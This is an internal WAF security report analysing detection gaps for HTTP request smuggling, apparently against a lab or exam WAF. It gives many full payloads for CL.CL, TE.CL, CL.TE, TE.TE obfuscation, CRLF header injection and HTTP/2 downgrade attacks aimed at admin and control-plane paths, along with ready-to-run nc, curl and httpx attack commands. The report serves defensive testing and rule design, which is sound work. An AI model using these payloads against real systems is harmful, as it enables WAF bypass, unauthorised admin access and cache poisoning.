# WAF Security Report — HTTP Request Smuggling Detection Gap Analysis

**Prepared for:** Security Team / WAF Engineering  
**Classification:** Internal — Security Sensitive  
**Date:** 2026-06-11  
**System under test:** Aegis-Gate WAF (http://sec-team.waf-exams.info, via localhost:8080)  
**Reference:** [PortSwigger — HTTP request smuggling](https://portswigger.net/web-security/request-smuggling), [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

## Executive Summary

| Metric | Value |
|--------|-------|
| Attack type | HTTP Request Smuggling |
| Total samples tested | 500 (185 successfully sent via HTTP/1.1) |
| Detected (blocked 403) | 93 (50.3%) |
| Missed (False Negative) | 92 (49.7%) |
| Root cause | WAF only detects duplicate `Content-Length` header; does not parse chunked encoding, obfuscated TE headers, CRLF injection, or H2 downgrade |

**Detection breakdown by technique:**

| Technique | Samples | Detected | Detection Rate |
|-----------|---------|----------|---------------|
| `CL.CL_duplicate_content_length` | 93 | 93 | **100%** ✓ |
| `TE.CL_frontend_TE_backend_CL` | 92 | 0 | **0%** ✗ |
| `CL.TE_frontend_CL_backend_TE` | 84 | 0 | **0%** ✗ |
| `TE.TE_obfuscated_transfer_encoding` | 75 | 0 | **0%** ✗ |
| `header_newline_injection_split` | 85 | 0 | **0%** ✗ |
| `H2.TE_http2_downgrade_smuggling` | 71 | 0 | **0%** ✗ |

**Important testing caveat:** The `urllib`-based test script cannot send raw chunked bodies or HTTP/2 requests — it normalizes headers and enforces HTTP/1.1 semantics. The 0% detection on TE-based techniques reflects both WAF misses **and** test tool limitations. Real-world exploitability requires manual testing with raw socket tools (see Section 6).

---

## 1. What is HTTP Request Smuggling?

HTTP Request Smuggling (CWE-444) exploits **ambiguity in how different components of a multi-tier HTTP stack interpret the boundary between consecutive HTTP requests**. When a frontend component (WAF, reverse proxy, load balancer) and a backend server disagree on where one request ends and the next begins, an attacker can "smuggle" a hidden partial request that the backend interprets as the beginning of the next user's request.

**The core vulnerability:** HTTP/1.1 provides two mechanisms for specifying message body length:
- `Content-Length` (CL): specifies body length in bytes
- `Transfer-Encoding: chunked` (TE): body is sent in chunks, terminated by a zero-length chunk (`0\r\n\r\n`)

When both headers are present, RFC 7230 mandates that `Transfer-Encoding` takes precedence and `Content-Length` must be ignored. However, not all implementations follow this rule correctly, and deliberate obfuscation can cause different parsing behavior between frontend and backend.

**Consequences of a successful smuggling attack:**
- **WAF bypass:** Inject a complete malicious request after a benign one — WAF sees only the benign wrapper, backend processes the malicious inner request
- **Cache poisoning:** Smuggle a request that poisons the response cache, causing other users to receive attacker-controlled responses
- **Session hijacking:** Capture another user's request body (including credentials or CSRF tokens) by prepending capture logic to their request
- **Access control bypass:** Access `/admin/` endpoints, `/config.yaml`, or WAF control-plane routes (`/__control/reset`) that are protected only by path-based rules
- **Cross-user request contamination:** The smuggled request prefix gets attached to the next user's request, causing unpredictable application behavior

---

## 2. Root Cause of WAF Miss

The WAF currently implements exactly one HTTP Smuggling detection rule:

**Implemented:** Detect duplicate `Content-Length` headers (two `Content-Length:` lines with different values)

**Missing:**
1. No parsing of `Transfer-Encoding: chunked` body to detect embedded request lines
2. No detection of obfuscated or duplicate `Transfer-Encoding` headers
3. No detection of CRLF sequences (`\r\n`, `%0d%0a`) within header values
4. No special handling of HTTP/2 requests that carry `transfer-encoding` headers (forbidden by RFC 9113)
5. No regex scanning of request body for embedded HTTP method lines (`GET / HTTP/1.1`, etc.)

---

## 3. Attack Technique Analysis — 6 Sub-techniques

### 3.1 `CL.CL_duplicate_content_length` — 93 samples, **100% detected** ✓

**Description:**  
The simplest smuggling variant. The attacker sends two `Content-Length` headers with different values. A frontend that uses the first value (e.g., 13) sees a longer body, while a backend that uses the second value (e.g., 6) reads a shorter body — the remaining bytes are interpreted as the start of a new request.

**Attack flow:**
```
Frontend (WAF) reads Content-Length: 13  → body = "smuggled=1\r\nGE"  (13 bytes, complete)
Backend        reads Content-Length: 6   → body = "smug" then...
                                           ...leftover = "led=1\r\nGET /api/rewards/claim HTTP/1.1\r\nHost: ..."
                                           → backend treats leftover as new request
```

**Dataset sample — ID=2, smuggled target: /api/rewards/claim:**
```http
POST / HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Content-Length: 6

smuggled=1
GET /api/rewards/claim HTTP/1.1
Host: sec-team.waf-exams.info

[WAF response: 403 BLOCKED ✓]
```

**Dataset sample — ID=3, smuggled target: /__control/reset (WAF control plane):**
```http
POST / HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Content-Length: 6

smuggled=1
GET /__control/reset HTTP/1.1
Host: sec-team.waf-exams.info

[WAF response: 403 BLOCKED ✓]
```

**Dataset sample — ID=7, smuggled target: /__control/state:**
```http
POST / HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Content-Length: 6

smuggled=1
GET /__control/state HTTP/1.1
Host: sec-team.waf-exams.info

[WAF response: 403 BLOCKED ✓]
```

This technique is correctly detected. WAF must not regress on this rule while adding the missing ones.

---

### 3.2 `TE.CL_frontend_TE_backend_CL` — 92 samples, **0% detected** ✗

**Description:**  
The frontend (WAF/proxy) processes `Transfer-Encoding: chunked` and reads the entire chunked body. The backend ignores TE and reads only `Content-Length: 4` bytes. Everything the frontend consumed beyond those 4 bytes becomes a prefix that the backend attaches to the next connection's request.

**Attack flow:**
```
Request arrives with both Content-Length: 4 and Transfer-Encoding: chunked.

Frontend reads chunked body:
  chunk [0x56 = 86 bytes]:  "POST /__control/reset HTTP/1.1\r\nHost: ...\r\nContent-Length: 5\r\n\r\n"
  chunk [0x00]:              end of chunked body
  Frontend sees: 1 complete POST request to /

Backend reads Content-Length: 4:
  reads "56\r\n"  (exactly 4 bytes: '5','6','\r','\n')
  Remaining in buffer: "POST /__control/reset HTTP/1.1\r\nHost: ...\r\n..."
  Backend treats this as a NEW, separate request

Next user's request arrives. Backend prepends the smuggled prefix:
  "POST /__control/reset HTTP/1.1\r\nHost: ...\r\n" + next_user_request_body
  → /__control/reset is processed with attacker-injected content
```

**Dataset sample — ID=8, smuggled target: /__control/reset:**
```http
POST / HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

54
GET /__control/reset HTTP/1.1
Host: sec-team.waf-exams.info
Content-Length: 5

0
0


[Explanation]
- "54" in hex = 84 decimal → chunk containing the smuggled request line
- The chunk body is:  "GET /__control/reset HTTP/1.1\r\nHost: sec-team.waf-exams.info\r\nContent-Length: 5\r\n\r\n"
- The final "0\r\n\r\n" terminates the chunked encoding
- Backend reads CL=4, sees "54\r\n", leftover smuggles /__control/reset

[WAF response: 400 Bad Request — not blocked, WAF passes through]
```

**Dataset sample — ID=9, smuggled target: /admin/users:**
```http
POST / HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

50
GET /admin/users HTTP/1.1
Host: sec-team.waf-exams.info
Content-Length: 5

0
0


[WAF response: 400 Bad Request — not blocked]
```

**Dataset sample — ID=16, smuggled target: /api/transactions:**
```http
POST / HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

55
GET /api/transactions HTTP/1.1
Host: sec-team.waf-exams.info
Content-Length: 5

0
0


[WAF response: 400 Bad Request — not blocked]
```

**Expected impact:** `smuggle_request_to_control_reset_bypass_waf` / `smuggle_request_to_admin_users_bypass_waf`

---

### 3.3 `CL.TE_frontend_CL_backend_TE` — 84 samples, **0% detected** ✗

**Description:**  
The frontend (WAF) reads `Content-Length: N` and treats the entire N-byte body as belonging to this request. The backend reads `Transfer-Encoding: chunked` instead, encounters the chunk terminator `0\r\n\r\n` very early in the body (right after the zero-size chunk), and considers the request complete. Everything after the `0\r\n\r\n` becomes the prefix of the next request from the backend's perspective.

**Attack flow:**
```
Frontend reads Content-Length: 110 → treats entire 110-byte body as belonging to this POST
Backend reads TE: chunked →
  reads "0\r\n\r\n"  (chunk terminator, 5 bytes)
  → request complete, body was empty
  Remaining bytes in buffer (the "smuggled" request):
    "GET /api/rewards/claim HTTP/1.1\r\nHost: sec-team.waf-exams.info\r\nX-Ignore: X\r\n"
  → Backend prepends this to the NEXT user's request
```

**Dataset sample — ID=12, smuggled target: /api/rewards/claim:**
```http
POST / HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
Transfer-Encoding: chunked

4b
GET /api/rewards/claim HTTP/1.1
Host: sec-team.waf-exams.info
X-Ignore: X
0


[Explanation]
- WAF sees Content-Length: 110, reads 110 bytes, passes entire request through
- Backend sees Transfer-Encoding: chunked
  - First chunk "4b" (75 bytes): the GET /api/rewards/claim line + headers
  - Terminator "0\r\n\r\n": end of chunked body
  - Effectively, backend considers current POST's body empty
  - The GET request becomes the prefix of the next connection's request

[WAF response: connection error — urllib cannot send this raw payload]
```

**Dataset sample — ID=13, smuggled target: /admin/dashboard:**
```http
POST / HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 108
Transfer-Encoding: chunked

49
GET /admin/dashboard HTTP/1.1
Host: sec-team.waf-exams.info
X-Ignore: X
0


[WAF response: connection error — urllib cannot send this raw payload]
```

**Dataset sample — ID=17, smuggled target: /config.yaml (sensitive file exposure):**
```http
POST / HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Transfer-Encoding: chunked

45
GET /config.yaml HTTP/1.1
Host: sec-team.waf-exams.info
X-Ignore: X
0


[Smuggling /config.yaml is especially dangerous — may expose WAF/app configuration]
[WAF response: connection error — urllib cannot send this raw payload]
```

---

### 3.4 `TE.TE_obfuscated_transfer_encoding` — 75 samples, **0% detected** ✗

**Description:**  
Two (or more) `Transfer-Encoding` headers are sent in the same request. One is a valid `chunked` directive; the other is obfuscated (invalid value, whitespace prefix, uppercase, etc.). Different components process different TE headers:

- Frontend processes the valid `Transfer-Encoding: chunked` header → reads chunked body completely
- Backend processes the obfuscated TE header, doesn't understand it, falls back to `Content-Length` mode → the CL/TE split creates smuggling conditions

**Obfuscation variants (observed in dataset and known from PortSwigger research):**
```http
Transfer-Encoding: xchunked            ← invalid value, may be accepted by some servers
Transfer-Encoding : chunked            ← leading space in header name
Transfer-Encoding: chunked, identity   ← multiple directives
Transfer-Encoding: chunked             ← trailing tab instead of CRLF
X-Transfer-Encoding: chunked           ← non-standard header name (some proxies forward)
Transfer-Encoding
    : chunked                          ← line folding (deprecated but parseable)
```

**Dataset sample — ID=4, smuggled target: /api/profile:**
```http
POST / HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: xchunked
Transfer-Encoding : chunked

0

GET /api/profile HTTP/1.1
Host: sec-team.waf-exams.info
Foo: x

[Explanation]
- Header line 1: Transfer-Encoding: xchunked  (invalid, some backends reject)
- Header line 2: Transfer-Encoding : chunked  (note: space before colon — valid name by some parsers)
- Frontend processes "xchunked" → doesn't understand, may fall back to CL=6 → reads 6 bytes
- Backend processes " chunked" → recognizes chunked → reads chunk "0" → done
  Everything after "0\r\n\r\n" is the smuggled GET /api/profile request

[WAF response: 400 Bad Request — not blocked]
```

**Dataset sample — ID=5, smuggled target: /config.yaml:**
```http
POST / HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: xchunked
Transfer-Encoding : chunked

0

GET /config.yaml HTTP/1.1
Host: sec-team.waf-exams.info
Foo: x

[WAF response: 400 Bad Request — not blocked]
```

**Dataset sample — ID=15, smuggled target: /admin/users:**
```http
POST / HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: xchunked
Transfer-Encoding : chunked

0

GET /admin/users HTTP/1.1
Host: sec-team.waf-exams.info
Foo: x

[WAF response: 400 Bad Request — not blocked]
```

**Expected impact:** `smuggle_request_to_api_profile_bypass_waf`, `smuggle_request_to_config.yaml_bypass_waf`, `smuggle_request_to_admin_users_bypass_waf`

---

### 3.5 `header_newline_injection_split` — 85 samples, **0% detected** ✗

**Description:**  
An attacker injects CRLF sequences (`\r\n`) into the value of a header (commonly `Transfer-Encoding`) to inject additional headers. If the WAF or an upstream proxy forwards the header value without sanitizing CRLF sequences, the injected bytes create new header lines in the forwarded request. A downstream component that parses these injected headers can be confused into misreading the request boundary.

This is also a foundation for HTTP response splitting and cache poisoning attacks.

**Injection vector:**
```
Transfer-Encoding: chunked\r\nX-Smuggled: GET /api/transactions HTTP/1.1
```

When forwarded verbatim, becomes two headers:
```
Transfer-Encoding: chunked
X-Smuggled: GET /api/transactions HTTP/1.1
```

**Encoded variants:**
```
Transfer-Encoding: chunked%0d%0aX-Evil: injected     ← URL-encoded CRLF
Transfer-Encoding: chunked%0aX-Evil: injected          ← URL-encoded LF only
Transfer-Encoding: chunked
X-Evil: value    ← Unicode CRLF
Transfer-Encoding: chunked%E5%98%8A%E5%98%8DX-Evil: v  ← overlong UTF-8 CRLF
```

**Dataset sample — ID=6, smuggled target: /api/transactions:**
```http
POST / HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked\r\nX-Smuggled: GET /api/transactions HTTP/1.1

0


[Raw wire format of the injection in the header value]:
  Transfer-Encoding: chunked
  X-Smuggled: GET /api/transactions HTTP/1.1
  (injected as a single header value containing literal \r\n)

[WAF response: 400 Bad Request — not blocked]
```

**Dataset sample — ID=10, smuggled target: /admin/users:**
```http
POST / HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked\r\nX-Smuggled: GET /admin/users HTTP/1.1

0


[WAF response: 400 Bad Request — not blocked]
```

**Dataset sample — ID=23, smuggled target: /config.yaml:**
```http
POST / HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked\r\nX-Smuggled: GET /config.yaml HTTP/1.1

0


[WAF response: 400 Bad Request — not blocked]
```

**Expected impact:** `smuggle_request_to_api_transactions_bypass_waf`, `smuggle_request_to_admin_users_bypass_waf`

---

### 3.6 `H2.TE_http2_downgrade_smuggling` — 71 samples, **0% detected** ✗

**Description:**  
HTTP/2 explicitly forbids "connection-specific" headers including `Transfer-Encoding` (RFC 9113 §8.2.2). A compliant HTTP/2 endpoint must reject requests containing `Transfer-Encoding`.

However, if the frontend (WAF) accepts HTTP/2 and translates ("downgrades") requests to HTTP/1.1 before forwarding to the backend, and if the WAF:
- Accepts the forbidden `transfer-encoding` header in HTTP/2 (instead of rejecting the request), and
- Forwards it as-is in the downgraded HTTP/1.1 request

Then the backend receives a valid-looking HTTP/1.1 request with `Transfer-Encoding: chunked`. Since the request arrived over HTTP/2, the WAF never parsed it as chunked — so the smuggled content inside the chunked body was invisible to the WAF.

**HTTP/2 wire format of the attack (pseudo-headers):**
```
:method: POST
:path: /
:scheme: https
:authority: sec-team.waf-exams.info
transfer-encoding: chunked          ← FORBIDDEN in H2, but forwarded by vulnerable WAF
content-type: application/x-www-form-urlencoded

0

GET /admin/dashboard HTTP/1.1
Host: sec-team.waf-exams.info
X-Evil: header
```

**After H2→H1.1 downgrade, backend receives:**
```http
POST / HTTP/1.1
Host: sec-team.waf-exams.info
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin/dashboard HTTP/1.1
Host: sec-team.waf-exams.info
X-Evil: header
```

**Backend reads TE: chunked → chunk `0` ends request body → smuggled GET /admin/dashboard is next request**

**Dataset sample — ID=1, smuggled target: /admin/dashboard:**
```
[HTTP/2 Request]
:method: POST
:path: /
:scheme: https
:authority: sec-team.waf-exams.info
transfer-encoding: chunked
content-type: application/x-www-form-urlencoded

Body:
  0\r\n
  \r\n
  GET /admin/dashboard HTTP/1.1\r\n
  Host: sec-team.waf-exams.info\r\n
  X-Evil: header

[Expected impact: smuggle_request_to_admin_dashboard_bypass_waf]
[WAF response: cannot test via urllib — requires HTTP/2 client]
```

**Dataset sample — ID=11, smuggled target: /api/profile:**
```
[HTTP/2 Request]
:method: POST
:path: /
:scheme: https
:authority: sec-team.waf-exams.info
transfer-encoding: chunked
content-type: application/x-www-form-urlencoded

Body:
  0\r\n
  \r\n
  GET /api/profile HTTP/1.1\r\n
  Host: sec-team.waf-exams.info\r\n
  X-Evil: header

[Expected impact: smuggle_request_to_api_profile_bypass_waf]
```

**Dataset sample — ID=26, smuggled target: /__control/reset (WAF control plane):**
```
[HTTP/2 Request]
:method: POST
:path: /
:scheme: https
:authority: sec-team.waf-exams.info
transfer-encoding: chunked
content-type: application/x-www-form-urlencoded

Body:
  0\r\n
  \r\n
  GET /__control/reset HTTP/1.1\r\n
  Host: sec-team.waf-exams.info\r\n
  X-Evil: header

[Expected impact: smuggle_request_to_control_reset_bypass_waf]
[This target is particularly critical — it targets the WAF's own control plane]
```

---

## 4. Smuggled Targets — Severity Breakdown

The following endpoints appear as `smuggled_target` across all techniques, ranked by severity:

| Smuggled Target | Appears in Samples | Risk |
|----------------|-------------------|------|
| `/__control/reset` | Multiple techniques | **Critical** — WAF control plane reset |
| `/__control/state` | Multiple techniques | **Critical** — WAF control plane state read |
| `/admin/dashboard` | Multiple techniques | **Critical** — Admin UI access |
| `/admin/users` | Multiple techniques | **High** — User management |
| `/config.yaml` | Multiple techniques | **High** — Application/WAF config exposure |
| `/api/rewards/claim` | Multiple techniques | **High** — Financial reward manipulation |
| `/api/transactions` | Multiple techniques | **High** — Financial data read |
| `/api/profile` | Multiple techniques | **Medium** — User profile read |

The presence of `/__control/reset` and `/__control/state` as smuggling targets is particularly concerning — these are Aegis-Gate's internal admin endpoints. A successful smuggling attack could reset or read the WAF's own state, neutralizing detection capabilities.

---

## 5. Detection Rules — Recommended WAF Updates

```
RULE SMUG-001 — CL + TE conflict (already partial, extend)
  IF request.headers.count("Content-Length") > 1
  → BLOCK 403  ← already implemented

  EXTEND: IF request has Content-Length AND Transfer-Encoding: chunked
  → Normalize: discard Content-Length, process only as chunked
  OR → BLOCK 400 (reject ambiguous requests)
  → COVERS: TE.CL, CL.TE
```

```
RULE SMUG-002 — Duplicate or obfuscated Transfer-Encoding
  IF request.headers.count("Transfer-Encoding") > 1
  → BLOCK 403

  IF Transfer-Encoding value NOT IN ["chunked", "identity", "gzip", "deflate", "br"]
  → BLOCK 403 (reject non-standard TE directives)
  → COVERS: TE.TE_obfuscated

  Specific values to reject:
    "xchunked", "chunked, identity", "CHUNKED", "x-chunked", "chunked "  (trailing space)
```

```
RULE SMUG-003 — CRLF injection in header values
  FOR EACH header value in request:
    IF contains literal CR (\r, 0x0D) OR LF (\n, 0x0A):
      → BLOCK 403
    IF contains URL-encoded CRLF (%0d, %0a, %0D, %0A):
      → BLOCK 403
    IF contains Unicode CRLF (, 
):
      → BLOCK 403
  → COVERS: header_newline_injection_split
```

```
RULE SMUG-004 — HTTP/2 forbidden headers
  IF protocol == HTTP/2 AND request has header "transfer-encoding":
    → BLOCK 400 (RFC 9113 §8.2.2 violation)
  IF protocol == HTTP/2 AND request has header "connection":
    → BLOCK 400
  → COVERS: H2.TE_http2_downgrade_smuggling
```

```
RULE SMUG-005 — HTTP request line pattern in body (defense in depth)
  Scan request body against regex:
    /(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS|TRACE)\s+\/[^\s]*\s+HTTP\/\d\.\d/
  IF match found in body → FLAG for review OR BLOCK 403
  → COVERS: All TE-based techniques as secondary signal

  Also scan body for HTTP header patterns:
    /^Host:\s+\S+/m  OR  /^Content-Length:\s+\d+/m
  → Additional signal for embedded request detection
```

```
RULE SMUG-006 — Chunk size validation (optional, defense in depth)
  When processing chunked body:
    Validate that chunk size hex values are legitimate
    Reject requests where declared chunk size exceeds remaining body length
    Reject requests where chunk data contains HTTP method lines
  → COVERS: TE.CL detection via body parsing
```

---

## 6. Recommended Testing Procedure

The `urllib`-based Python test script cannot send raw smuggling payloads because Python's HTTP stack normalizes headers and enforces HTTP/1.1 semantics. The following tools are required for accurate testing:

### 6.1 Raw socket test (TE.CL example)

```bash
# Send TE.CL attack using netcat (raw TCP)
printf 'POST / HTTP/1.1\r\nHost: localhost:8080\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n56\r\nPOST /__control/reset HTTP/1.1\r\nHost: sec-team.waf-exams.info\r\nContent-Length: 5\r\n\r\n0\r\n\r\n' | nc localhost 8080

# Expected after WAF fix: HTTP/1.1 403 Forbidden
# Current behavior:       HTTP/1.1 400 Bad Request (pass-through)
```

### 6.2 curl with raw body

```bash
# CL.TE attack
curl -v http://localhost:8080/ \
  -H "Content-Length: 110" \
  -H "Transfer-Encoding: chunked" \
  --data-binary $'4b\r\nGET /api/rewards/claim HTTP/1.1\r\nHost: sec-team.waf-exams.info\r\nX-Ignore: X\r\n0\r\n\r\n'

# TE.TE obfuscated
curl -v http://localhost:8080/ \
  -H "Transfer-Encoding: xchunked" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 6" \
  --data-binary $'0\r\n\r\nGET /admin/users HTTP/1.1\r\nHost: sec-team.waf-exams.info\r\nFoo: x\r\n'
```

### 6.3 Dedicated smuggling tool

```bash
# smuggler.py — comprehensive automated HTTP smuggling detection
git clone https://github.com/defparam/smuggler
python3 smuggler.py -u http://localhost:8080/ -v

# Burp Suite Professional — HTTP Request Smuggler extension
# Launch Burp → Proxy → Extensions → Add → HTTP Request Smuggler
# Scan Target → right-click → Extensions → HTTP Request Smuggler → Guess-based scanning
```

### 6.4 HTTP/2 testing

```bash
# Test H2.TE using httpx (supports HTTP/2)
python3 -c "
import httpx
client = httpx.Client(http2=True, verify=False)
r = client.post(
    'https://localhost:8443/',
    headers={'transfer-encoding': 'chunked'},
    content=b'0\r\n\r\nGET /admin/dashboard HTTP/1.1\r\nHost: sec-team.waf-exams.info\r\n'
)
print(r.status_code, r.headers)
"

# Test with curl --http2
curl -v --http2 https://localhost:8443/ \
  -H "transfer-encoding: chunked" \
  --data-binary $'0\r\n\r\nGET /admin/dashboard HTTP/1.1\r\nHost: sec-team.waf-exams.info\r\n'
```

### 6.5 Re-run dataset test after rule deployment

```bash
cd /Users/sabo/Workspace/waf/load_test
# Note: raw chunked attacks still won't reach WAF via urllib, use dedicated tools above
# But SMUG-003 (CRLF) and SMUG-004 (H2 header presence) can be validated via dataset
python3 attack_analysis.py --types smuggling --rate 50 --fn-only
```

---

## 7. Priority Remediation Order

| Priority | Rule | Technique Covered | Effort |
|----------|------|-------------------|--------|
| P0 | SMUG-004: Reject H2 `transfer-encoding` header | H2.TE downgrade | Low |
| P0 | SMUG-003: Block CRLF in header values | header_newline_injection | Low |
| P1 | SMUG-001: Reject CL+TE conflict | TE.CL, CL.TE | Medium |
| P1 | SMUG-002: Reject duplicate/obfuscated TE | TE.TE_obfuscated | Medium |
| P2 | SMUG-005: Body scan for embedded HTTP lines | All TE techniques | Medium |
| P2 | SMUG-006: Strict chunked body validation | TE.CL detection | High |

P0 items require only header-level checks with no body parsing — they can be deployed immediately with minimal performance impact. P1 items require parsing header semantics. P2 items involve body scanning and should be validated for performance before enabling in high-throughput environments.

---

*End of HTTP Request Smuggling Report*
